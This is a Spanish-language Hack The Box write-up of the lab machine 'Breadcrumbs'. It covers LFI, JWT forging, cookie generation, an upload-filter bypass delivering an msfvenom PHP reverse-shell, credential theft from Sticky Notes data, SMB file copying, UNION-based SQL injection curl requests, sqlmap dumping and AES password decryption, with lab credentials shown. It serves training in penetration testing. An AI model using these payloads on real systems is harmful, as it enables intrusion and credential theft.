---
description: >-
  G4l1l30 write-up on the hard-difficulty Linux machine Breadcrumbs from
  https://hackthebox.eu
title: Hack the Box - Breadcrumb Writeup
date: 2021-07-17 10:40:00 -0600
categories: [Hack the Box, Writeup]
tags: [htb, hacking, hack the box, redteam, Windows,LFI,bypass file upload, sqlmap dump, port fordwarding, sqli, sqlmap, analyse binary,sqlite leak, jwt token, phpssesid ]     # TAG names should always be lowercase
show_image_post: true
image: (/assets/img/Linux/Breadcrumbs/InfoCard-Breadcrumbs.png



---

# Summary



Breadcrumbs es una VM Hard de HackTheBox en el cual utilizamos LFI para hacernos con informacion del usuario Paul para crear un token JWT, una vez logueados, tenemos la opcion de subir un archivo, el mismo tiene un filtro del lado del cliente que valida la extension .zip, hacemos un bypass con Burpsuite y obtenemos un foothold como WWW-Data, luego encontramos las credenciales del usuario Juliette en un .json, ahora ya tenemos nuestra primera flag, tenemos un hint en el desktop que nos apunta hacia Sticky Note, hacemos un hunting hacia el mismo y encontramos una DB del cual obtenemos un leak con sqlite3, con esto nos hacemos con el usuario Development :D, tenemos acceso a el directorio C:\Development en el cual hay un binario, analizando el mismo encontramos una ruta http que nos proporciona una AES Key, luego procedemos a hacer SQLi (ya sea de forma manual o haciendo un fordward del puerto y usar sqlmap), obtenemos un password de Administrator, el mismo lo desciframos con base64 y el output lo pasamos a AES Decrypt en Cyberchef y usando la Key obtenemos el password para loguearnos como Admin.

![InfoCard-Breadcrumbs](/assets/img/Linux/Breadcrumbs/InfoCard-Breadcrumbs.png)



## Info de la maquina

| VM column  | Detalles     |
| ---------- | ------------ |
| Nombre     | Breadcrumbs  |
| Dificultad | Hard         |
| Release    | 20 Feb 2021  |
| OS         | Windows      |
| IP         | 10.10.10.228 |

Editamos ***/etc/hosts***  y agregamos la IP **10.10.10.228** que apunte hacia **breadcrumbs.htb** 

# Escaneo de Puertos

Escaneamos los puertos con Masscan y Nmap, utilizando **Masscan_To_Nmap** , esta herramienta escanea puertos TCP y UDP, toma los abiertos y ejecuta Nmap en búsqueda de servicios y scripts por default, mas info y donde conseguir el script: 

* > [https://github.com/Purp1eW0lf/Masscan_to_Nmap](masscan_to_nmap.py)

Ejecutamos el script : ``sudo python3 masscan_to_nmap.py -i 10.10.10.228``

![nmap](/assets/img/Linux/Breadcrumbs/nmap.png)

Muchos puertos :man_shrugging:

```bash
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-15 04:34 BST
Nmap scan report for breadcrumbs.htb (10.10.10.228)
Host is up (0.13s latency).

PORT      STATE SERVICE       VERSION
22/tcp    open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 9d:d0:b8:81:55:54:ea:0f:89:b1:10:32:33:6a:a7:8f (RSA)
|   256 1f:2e:67:37:1a:b8:91:1d:5c:31:59:c7:c6:df:14:1d (ECDSA)
|_  256 30:9e:5d:12:e3:c6:b7:c6:3b:7e:1e:e7:89:7e:83:e4 (ED25519)
80/tcp    open  http          Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1h PHP/8.0.1)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1h PHP/8.0.1
|_http-title: Library
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp   open  ssl/http      Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1h PHP/8.0.1)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1h PHP/8.0.1
|_http-title: Library
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
445/tcp   open  microsoft-ds?
3306/tcp  open  mysql?
| fingerprint-strings: 
|   Kerberos, LANDesk-RC, SMBProgNeg: 
|_    Host '10.10.14.29' is not allowed to connect to this MariaDB server
5040/tcp  open  unknown
7680/tcp  open  pando-pub?
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC

```

# Enum

Entre los conocidos, tenemos Websites, SSH, MariaDB, estos dos ultimos no nos sirven de nada por ahora, asi que empecemos por el puerto **80** y **443**.

Identificamos la tecnologia con **whatweb**:

![whatweb](/assets/img/Linux/Breadcrumbs/whatweb.png)

El Main Site(es lo mismo en ambos puertos): 

![mainsite](/assets/img/Linux/Breadcrumbs/mainsite.png)

Verificamos algun libro :

![books](/assets/img/Linux/Breadcrumbs/books.png)

Interceptamos con Burpsuite cuando le damos a search:

![burp4](/assets/img/Linux/Breadcrumbs/burp4.png)

Ahora interceptamos cuando ejecutamos Book:

![burp2](/assets/img/Linux/Breadcrumbs/burp2.png)

![burp3](/assets/img/Linux/Breadcrumbs/burp3.png)

Si cambiamos el valor de la variable **method** en ambos request, nos da casi el mismo error excepto algo.

![burp5](/assets/img/Linux/Breadcrumbs/burp5.png)

![burp6](/assets/img/Linux/Breadcrumbs/burp6.png)

En uno de los dos request tenemos un potencial LFI : 

```bash
Warning:  file_get_contents(../books/): Failed to open stream: No such file or directory in C:\Users\www-data\Desktop\xampp\htdocs\includes\bookController.php on line 28
false
```

![Burp7](/assets/img/Linux/Breadcrumbs/Burp7.png)

Utilizaremos bruteforce directory para buscar posibles files que podamos aprovechar con este LFI.



# Bruteforce directory

![Force](/assets/img/Linux/Breadcrumbs/Force.png)

Existen varias herramientas para esto, en mi caso utilizare **gobuster** 

```bash
gobuster dir -u http://breadcrumbs.htb/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt


```

![directorios](/assets/img/Linux/Breadcrumbs/directorios.png)

Tenemos unos cuantos directorios interesantes:

![DB](/assets/img/Linux/Breadcrumbs/DB.png)

![includes](/assets/img/Linux/Breadcrumbs/includes.png)

Si vamos a : `http://breadcrumbs.htb/portal/login.php` encontraremos un href que nos lleva hacia `http://breadcrumbs.htb/portal/php/admins.php` :happy: retrocedemos una vez y obtenemos:

![portal_](/assets/img/Linux/Breadcrumbs/portal_.png)

Con esto y LFI,  procederemos a indagar en esos mismos archivos.

# LFI II

Vamos a empezar con `/db/db.php` 

![db2](/assets/img/Linux/Breadcrumbs/db2.png)

Tenemos la siguientes credenciales : 

```text
bread|jUli901
```

Lamentablemente no tenemos acceso externalmente, ahora seguiremos con el siguiente archivo:

`book=../portal/includes/filecontroller.php&method=1 `

![secret_key](/assets/img/Linux/Breadcrumbs/secret_key.png)

Obtenemos una secret key del usuario Paul 

`secret key = 6cb9c1a2786a483ca5e44571dcc5f3bfa298593a6376ad92185c3258acd5591e` 

Si miramos atentamente es JWT, asi que podemos crear un token JWT para pretender que somos Paul.

* | [https://jwt.io/](https://jwt.io/)

![Token](/assets/img/Linux/Breadcrumbs/Token.png)


`Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjp7InVzZXJuYW1lIjoicGF1bCJ9fQ.4mJguG8tRd2z_feWJpmr_J3AdMeDPvW7GCK7cW7o0AI`


Ahora necesitaremos el PHPSESSID, para esto verificaremos la siguiente ruta: 

`book=../portal/cookie.php&method=1 `

![cookie](/assets/img/Linux/Breadcrumbs/cookie.png)

Atento al mensaje, nos aconsejan no usar el default PHPSESSID, sin embargo, ese codigo, tenemos lo necesario para armar el nuestro, El phpsessid se crea mediante un string de hash md5 utilizando el nombre de usuario(mas arriba, en el portal tenemos una serie de usuarios "Admins", pero como hemos encontrado un secret key de paul, El sera nuestro target)

```php
<?php
$username = "paul";
$max = strlen($username) -1;
$seed = rand(0, $max);
$key = "s4lTy_stR1nG_".$username[$seed]."(!528./9890";
$cookie = $username.md5($key);
echo $cookie;
?>
```



Nota: No me cruxifiquen por no usar una funcion.

![paul_cookie](/assets/img/Linux/Breadcrumbs/paul_cookie.png)

Aparentemente funciona :skull: procederemos a generar varios:

```bash
for i in {0..10};do php cookie.php;echo '';sleep 1;done
```

![cookie2](/assets/img/Linux/Breadcrumbs/cookie2.png)

# Foothold : Portal autentication Paul

Ahora vamos a loguearnos como Paul con una de esas cookies.

![Paul_Portal](/assets/img/Linux/Breadcrumbs/Paul_Portal.png)



Nos dirigimos hacia : `http://breadcrumbs.htb/portal/php/files.php` 

![files](/assets/img/Linux/Breadcrumbs/files.png)

Si intentamos subir algo :

![error](/assets/img/Linux/Breadcrumbs/error.png)

:cry: No funciona, sin embargo mas arriba ya tenemos nuestro Token :)  : `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjp7InVzZXJuYW1lIjoicGF1bCJ9fQ.4mJgu G8tRd2z_feWJpmr_J3AdMeDPvW7GCK7cW7o0AI`



![sucess](/assets/img/Linux/Breadcrumbs/sucess.png)

Antes de continuar, nos tenemos que plantear el escenario, tenemos un File Upload que solo acepta **.zip** , no sabemos que tipo de filtro hay dentras(del lado del cliente o servidor). En el BruteForce Directory, encontramos una ruta interesante **/js** entre lo cual destaca : 

![upload_vul](/assets/img/Linux/Breadcrumbs/upload_vul.png)

Tenemos un filtro del lado del cliente, bastante sencillo de bypassear, para esto usamos Burp, msfvenom, subimos el archivo como .zip y con burp lo editamos a **.php** <----Ojo con eso.

```bash
 msfvenom -p php/reverse_php LHOST=10.10.14.29 LPORT=4444 -f raw > gali.zip
[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
No encoder specified, outputting raw payload
Payload size: 3022 bytes

#Dejamos netcat escuchando en el puerto 4444
```



![bypass](/assets/img/Linux/Breadcrumbs/bypass.png)

![upload_02](/assets/img/Linux/Breadcrumbs/upload_02.png)

![success](/assets/img/Linux/Breadcrumbs/success.png)

Success! 

<img src="/assets/img/Linux/Breadcrumbs/work.png" alt="work" style="zoom:67%;" />

Ahora vamos a */uploads* :

`http://breadcrumbs.htb/portal/uploads/` 

En mi caso seria : http://breadcrumbs.htb/portal/uploads/gali.php

![www](/assets/img/Linux/Breadcrumbs/www.png)

Somos www-data :D

# Juliette Part

Esta es la parte facil, enumerando encontramos un file interesante en 

`C:\Users\www-data\Desktop\xampp\htdocs\portal\pizzaDeliveryUserData>` 

![paule](/assets/img/Linux/Breadcrumbs/paule.png)

`type juliette.json` 

![juliette](/assets/img/Linux/Breadcrumbs/juliette.png)

Tenemos la siguiente credenciales

`juliette | jUli901./())!`

...Y si recordamos los puertos abiertos, el **22** esta open, y estas credenciales funcionan :D 

![Julietteee](/assets/img/Linux/Breadcrumbs/Julietteee.png)

![usertxt](/assets/img/Linux/Breadcrumbs/usertxt.png)

Si verificamos `todo.html` 

```html
<html><style>html{background:black;color:orange;}table,th,td{border:1px solid orange;padding:1em;border-collapse:collapse;}</style><table>        <tr>            <th>Task</th>            <th>Status</th>            <th>Reason</th>        </tr>        <tr>            <td>Configure firewall for port 22 and 445</td>            <td>Not started</td>            <td>Unauthorized access might be possible</td>         </tr>        <tr>            <td>Migrate passwords from the Microsoft Store Sticky Notes application to our new password manager</td>            <td>In progress</td>            <td>It stores passwords in plain text</td>        </tr>        <tr>            <td>Add new features to password manager</td>            <td>Not started</td>            <td>To get promoted, hopefully lol</td>        </tr></table></html>
```

Asi que basicamente tenemos que hacer hunting en los Sticky Notes :smile: El mismo se ubica en `%AppData%` 

Nos pasamos a Powershell y hacemos una busquedad recursiva:

```powershell
Get-ChildItem -recurse | select-object fullname | select-string "sticky"
```



![Sticky](/assets/img/Linux/Breadcrumbs/Sticky.png)

En el directorio :

`C:\Users\juliette\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState`

Nos encontramos con :

![LocalState](/assets/img/Linux/Breadcrumbs/LocalState.png)

Bien, podemos transferirnos con nc o via smb, prefiero la 2da.

Subimos un servidor SMB: 

```bash
sudo impacket-smbserver parrot . -smb2support
```

![smbserver](/assets/img/Linux/Breadcrumbs/smbserver.png)

Copiamos el contenido a nuestra maquina.

```
copy * \\10.10.xx.xx\\parrot
```

Interactuamos con la db que nos descargamos con **sqlite3**

```sql
sqlite3 plum.sqlite #Usamos sqlite3 para interactuar con la DBSQLite version 3.34.1 2021-01-20 14:10:07Enter ".help" for usage hints.sqlite> .tables #Listamos las tablasMedia           Stroke          SyncState       User          Note            StrokeMetadata  UpgradedNote  sqlite> PRAGMA table_info(Note); #Informacion de la tabla `Note` que es nuestro target.0|Text|varchar|0||01|WindowPosition|varchar|0||02|IsOpen|integer|0||03|IsAlwaysOnTop|integer|0||04|CreationNoteIdAnchor|varchar|0||05|Theme|varchar|0||06|IsFutureNote|integer|0||07|RemoteId|varchar|0||08|ChangeKey|varchar|0||09|LastServerVersion|varchar|0||010|RemoteSchemaVersion|integer|0||011|IsRemoteDataInvalid|integer|0||012|Type|varchar|0||013|Id|varchar|1||114|ParentId|varchar|0||015|CreatedAt|bigint|0||016|DeletedAt|bigint|0||017|UpdatedAt|bigint|0||0select * from Note;\id=48c70e58-fcf9-475a-aea4-24ce19a9f9ec juliette: jUli901./())! #Esta creds ya la tenemos\id=fc0d8d70-055d-4870-a5de-d76943a68ea2 development: fN3)sN5Ee@g #Nuevas creds :)\id=48924119-7212-4b01-9e0f-ae6d678d49b2 administrator: [MOVED]|ManagedPosition=|1|0||Yellow|0|||||||0c32c3d8-7c60-48ae-939e-798df198cfe7|8e814e57-9d28-4288-961c-31c806338c5b|637423162765765332||637423163995607122
```

Tenemos unas nuevas creds

```bash
development: fN3)sN5Ee@g #Sirven para SSH, asi que nos logueamos.
```

# Development Part

Ya estamos con el usuario Development, hay un directorio que llama la atencion en C:\Development

![Krypter_linux](/assets/img/Linux/Breadcrumbs/Krypter_linux.png)

Tenemos un binario, lo pasamos igual que la DB de mas arriba y procederemos a destriparlo con **strace** (esto no es mi fuerte hehe)

```bash
strace ./Krypter_Linux                                                                             
```

![New_Project](/assets/img/Linux/Breadcrumbs/New_Project.png)

Antes de intentar con un dissembler, vamos a utilizar strings (shame!!!) en busqueda del pass:

```
strings ./Krypter_Linux | grep -i pass
```

![grep](/assets/img/Linux/Breadcrumbs/grep.png)

Pasamos la prueba :sob:

![sudor](/assets/img/Linux/Breadcrumbs/sudor.gif)

Tenemos lo siguiente :

```bash
Get password from cloud and AUTOMATICALLY decrypt!http://passmanager.htb:1234/index.phpmethod=select&username=administrator&table=passwords
```

Ese puerto no lo identificamos en nuestro escaneo, usamos `netstat -ant` para verificar internalmente

![internal](/assets/img/Linux/Breadcrumbs/internal.png)

Asi que procedemos: 

```bash
curl "http://127.0.0.1:1234/index.php?method=select&username=administrator&table=passwords"
```

Nos arroja devuelta esto:

```php
selectarray(1) {  [0]=>  array(1) {    ["aes_key"]=>    string(16) "k19D193j.<19391("  }}
```

Tenemos una key AES.  Apartir de aqui podemos proceder de dos formas, SQLi manual o SQLMAP. Hagamos las dos.

## SQLi Manual

Vamos hacer un Union Select 

```bash
curl "http://127.0.0.1:1234/index.php?method=select&username='+union+select+1%23&table=passwords"
```

![sqli_manual](/assets/img/Linux/Breadcrumbs/sqli_manual.png)

Identifiquemos la DB

```bash
curl "http://127.0.0.1:1234/index.php?method=select&username='+union+select+database()%23&table=passwords"selectarray(1) {  [0]=>  array(1) {    ["aes_key"]=>    string(5) "bread"  }}
```

DB: Bread

Ahora sacamos las tablas:

```bash
curl "http://127.0.0.1:1234/index.php?method=select&username='+union+select+group_concat(table_name)+from+information_schema.tables+where+table_schema='bread'%23&table=passwords"selectarray(1) {  [0]=>  array(1) {    ["aes_key"]=>    string(9) "passwords"  }}
```

Luego vamos por la columnas:

```bash
curl "http://127.0.0.1:1234/index.php?method=select&username='+union+select+group_concat(column_name)+from+information_schema.columns+where+table_name='passwords'%23&table=passwords"selectarray(1) {  [0]=>  array(1) {    ["aes_key"]=>    string(27) "id,account,password,aes_key"  }}
```



y por ultimo sacamos el id,account y password:

```bash
curl "http://127.0.0.1:1234/index.php?method=select&username='+union+select+group_concat(id,account,password)+from+bread.passwords%23&table=passwords"selectarray(1) {  [0]=>  array(1) {    ["aes_key"]=>    string(58) "1AdministratorH2dFz/jNwtSTWDURot9JBhWMP6XOdmcpgqvYHG35QKw="  }}#Separandolo un poco tenemos : 1 Administrator H2dFz/jNwtSTWDURot9JBhWMP6XOdmcpgqvYHG35QKw=
```

## SQLi guiado/auto

Para esto hacemos un fordward del puerto por ssh

```bash
ssh -f -N -L 1234:127.0.0.1:1234 development@breadcrumbs.htb
```

Verificamos con `netstat -antp`

![local_ssh](/assets/img/Linux/Breadcrumbs/local_ssh.png)

Ahora usamos `sqlmap` 

```bash
sqlmap -u "http://127.0.0.1:1234/index.php?method=select&username=administrator&table=passwords" --dump
```



![sqli_guiado](/assets/img/Linux/Breadcrumbs/sqli_guiado.png)

```bash
Database: breadTable: passwords[1 entry]+----+---------------+------------------+----------------------------------------------+| id | account       | aes_key          | password                                     |+----+---------------+------------------+----------------------------------------------+| 1  | Administrator | k19D193j.<19391( | H2dFz/jNwtSTWDURot9JBhWMP6XOdmcpgqvYHG35QKw= |+----+---------------+------------------+----------------------------------------------+
```



# Administrator

Completando las piezas tenemos:

```text
ID = 1Account = AdministratorAES KEY = k19D193j.<19391(Password = H2dFz/jNwtSTWDURot9JBhWMP6XOdmcpgqvYHG35QKw=
```

El procedimiento es bastante sencillo

1. Desde el password lo desciframos con base64
2. El Output lo pasamos a AES, tanto el input como el ouput a raw, le pasamos la KEY y el IV tantos ceros como nos pide para sastifacer lo esperado.

* | [Password desde CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',false)AES_Decrypt(%7B'option':'Latin1','string':'k19D193j.%3C19391('%7D,%7B'option':'Hex','string':'0000000000000000000000000000000'%7D,'CBC','Raw','Raw',%7B'option':'Hex','string':''%7D,%7B'option':'Hex','string':''%7D)&input=SDJkRnovak53dFNUV0RVUm90OUpCaFdNUDZYT2RtY3BncXZZSEczNVFLdz0)

Nota: Si estan muy inspirados, pueden hacer un script en python :D  importanto AES y Base64

Habemus password de Administrator : p@ssw0rd!@#$9890./

![root](/assets/img/Linux/Breadcrumbs/root.png)

Another machine pwnead!

![hacktheplanet](/assets/img/Linux/Breadcrumbs/hacktheplanet.gif)

